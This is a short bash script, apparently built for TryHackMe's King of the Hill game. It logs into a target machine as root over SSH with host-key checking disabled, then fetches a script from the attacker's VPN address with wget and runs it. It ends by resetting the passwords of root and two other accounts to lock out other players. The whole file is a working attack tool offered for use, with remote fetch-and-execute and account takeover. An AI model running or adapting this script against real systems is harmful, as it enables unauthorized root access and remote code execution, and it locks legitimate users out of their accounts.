#!/bin/bash

# Created by @HaruKey :)

# https://github.com/H4ruKey/KOTH

while getopts ":i:u:p:" opt; do
  case $opt in
    i) IP="$OPTARG" ;;
    u) username="$OPTARG" ;;
    p) new_password="$OPTARG" ;;
  esac
done

if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
  exit 1
fi

vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)

ssh -o StrictHostKeychecking=no -i id_rsa -p 1337 root@"$IP" << EOF

cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
echo "root:$new_password" | chpasswd
echo "gloria:$new_password" | chpasswd
echo "marty:$new_password" | chpasswd

EOF
